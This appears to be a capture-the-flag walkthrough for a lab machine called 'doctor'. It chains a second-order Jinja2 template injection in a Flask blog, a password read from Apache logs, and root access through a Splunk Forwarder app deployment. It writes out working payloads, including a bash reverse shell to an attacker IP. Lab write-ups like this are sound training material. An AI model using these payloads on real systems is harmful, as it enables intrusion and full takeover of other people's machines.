Phase 1

Initial Access — Second-Order Jinja2 SSTI

Why this SSTI is uniquely stealthy The injection point is the post title field at /post/new. But the execution happens on a completely different page — /archive. Even there, the output is invisible in the rendered page; it only appears in the HTML source code (Ctrl+U). This is a textbook second-order injection: input in one place, execution in another, visible only in raw source.

Confirm SSTI

Register an account, create a new post with title {{7*'7'}}, then view source of /archive:

<item><title>7777777</title></item>

7*'7' = string repeated 7 times = Jinja2 confirmed (Twig would output 49).

Template Engine Identification Decision Tree

${7*7}
├── works → a{*comment*}b
│   ├── works → Smarty
│   └── nope  → ${"z".join("ab")}
│       ├── works → Mako
│       └── nope  → Unknown
└── nope  → {{7*7}}
    ├── works → {{7*'7'}}
    │   ├── 7777777 → Jinja2  ← this machine
    │   └── 49      → Twig
    └── nope  → Not vulnerable

Vulnerable Code

# /home/web/blog/flaskblog/main/routes.py
@main.route("/archive")
def feed():
    posts = Post.query.order_by(Post.date_posted.asc())
    tpl = '<?xml ...><rss><channel><title>Archive</title>'
    for post in posts:
        tpl += "<item><title>"+post.title+"</title></item>\n"
    return render_template_string(tpl)  # ← user input in template!
20-minute timer A cron job (*/20 * * * * /opt/clean/cleandb.py) wipes all accounts and posts every 20 minutes. Work fast after registering — if your posts disappear, re-register and re-inject.
Phase 2

Lateral Movement — Apache Log Password Leak

web@doctor:~$ groups
web adm
adm group = log access The adm group grants read access to /var/log. Logs often contain accidentally submitted credentials — form data, debug output, failed authentication attempts with passwords in the wrong field. 
web@doctor:/var/log/apache2$ grep -ri passw backup
10.10.14.4 - - "POST /reset_password?email=Guitar123" 500 453

Someone typed their password (Guitar123) into the email field during a password reset. Apache logged the full URL including the query string.

web@doctor:~$ su shaun
Password: Guitar123

shaun@doctor:~$ cat user.txt

Phase 3

Privilege Escalation — Splunk Forwarder Malicious App Deployment

Splunk Forwarder as a root shell launcher Splunk Universal Forwarder runs as root and accepts "app" deployments via its management port (8089). An "app" can include scripts that execute with Splunk's privileges. With valid credentials, SplunkWhisperer2 deploys a fake app containing a reverse shell script — Splunk dutifully runs it as root. 
$ python3 PySplunkWhisperer2_remote.py \
  --host 10.129.2.21 \
  --lhost 10.10.15.65 \
  --username shaun \
  --password Guitar123 \
  --payload "bash -c 'bash -i >& /dev/tcp/10.10.15.65/5555 0>&1'"
$ nc -lnvp 5555
root@doctor:/# cat /root/root.txt
97cf0cfb1d031d39466b29e14cfbe909
Appendix

Key Takeaways

Second-order SSTI requires checking all output locations.

The injection was in post titles, but execution happened in /archive's source code. Always enumerate all routes and check raw HTML source — not just rendered pages.

Template engine fingerprinting follows a decision tree.

{{7*'7'}} = 7777777 → Jinja2. = 49 → Twig. Memorize the tree — it saves time on every SSTI test.

The adm group is a privilege escalation goldmine.

It grants read access to all system logs. grep -ri passw /var/log/ should be your first command after discovering adm membership.

Splunk Forwarder 8089 + valid credentials = instant root.

SplunkWhisperer2 automates the entire attack: deploy fake app → script runs as root → shell. Any exposed Splunk management port with guessable credentials is game over.

Email addresses on web pages hint at virtual hosts.

info@doctors.htb revealed a completely different application on the same IP. Always try domain names found in page content as vhost candidates.

vhost discovery→SSTI in /archive→web shell→log leak → shaun→Splunk app → root
